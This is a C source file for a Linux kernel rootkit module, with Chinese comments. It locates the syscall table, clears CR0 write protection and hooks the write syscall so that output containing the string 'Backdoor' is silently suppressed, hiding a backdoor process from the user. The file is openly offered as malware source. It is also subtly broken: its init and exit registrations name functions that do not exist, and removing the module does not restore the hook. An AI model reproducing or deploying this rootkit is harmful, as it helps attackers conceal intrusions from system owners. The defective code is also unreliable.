#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <asm/uaccess.h>
#include <linux/unistd.h>
#include <linux/slab.h>



char psname[10] = "Backdoor";
char *processname = psname;
void** sys_call_table;

struct linux_dirent{
	unsigned long     d_ino;
	unsigned long     d_off;
	unsigned short    d_reclen;
	char    d_name[1];
};

void * get_lstar_sct_addr(void);
unsigned long ** get_lstar_sct(void);
void disable_write_protection(void);
void enable_write_protection(void);

asmlinkage long (*orig_write)(unsigned int fd,
		char *buf, unsigned int count);

// 找 sys_call_table
void *
get_lstar_sct_addr(void)
{
    u64 lstar;
    u64 index;
    
    rdmsrl(MSR_LSTAR, lstar);
    for (index = 0; index <= PAGE_SIZE; index += 1) {
        u8 *arr = (u8 *)lstar + index;

        if (arr[0] == 0xff && arr[1] == 0x14 && arr[2] == 0xc5) {
            return arr + 3;
        }
    }

    return NULL;
}

// 在获得sys_call_table地址时，
// 需要和0xffffffff00000000相或，否则可能引起宕机
unsigned long **
get_lstar_sct(void)
{
    // Stupid compiler doesn't want to do bitwise math on pointers
    unsigned long *lstar_sct_addr = get_lstar_sct_addr();
    if (lstar_sct_addr != NULL) {
        u64 base = 0xffffffff00000000;
        u32 code = *(u32 *)lstar_sct_addr;
        return (void *)(base | code);
    } else {
        return NULL;
    }                                         
}

// 关闭写保护
void disable_write_protection(void)
{
        unsigned long cr0 = read_cr0();
        clear_bit(16, &cr0);
        write_cr0(cr0);
}

// 打开写保护
void enable_write_protection(void)
{
        unsigned long cr0 = read_cr0();
        set_bit(16, &cr0);
        write_cr0(cr0);
}

asmlinkage long hacked_write(unsigned int fd,
		char * buf, unsigned int count)
{
    char *k_buf;
	k_buf = (char*)kmalloc(256,GFP_KERNEL);
	memset(k_buf,0,256);
	copy_from_user(k_buf,buf,255);
    if(strstr(k_buf,processname))
	{
		kfree(k_buf);
		return count;
	}
    kfree(k_buf);
    return orig_write(fd,buf,count);
}
static int rooty_init(void)
{   
    sys_call_table = get_lstar_sct();
    orig_write = sys_call_table[__NR_write];
    printk("offset: 0x%x\n\n\n\n",orig_write);
    disable_write_protection();
	sys_call_table[__NR_write] = hacked_write;
	enable_write_protection();
    printk(KERN_INFO "hideps2: module loaded.\n");//就是消息记录等级
	return 0;
}


static void rooty_exit(void)
{
    printk(KERN_INFO "hideps: module removed\n");
}


MODULE_LICENSE("GPL");
module_init(filter_init);
module_exit(filter_exit);
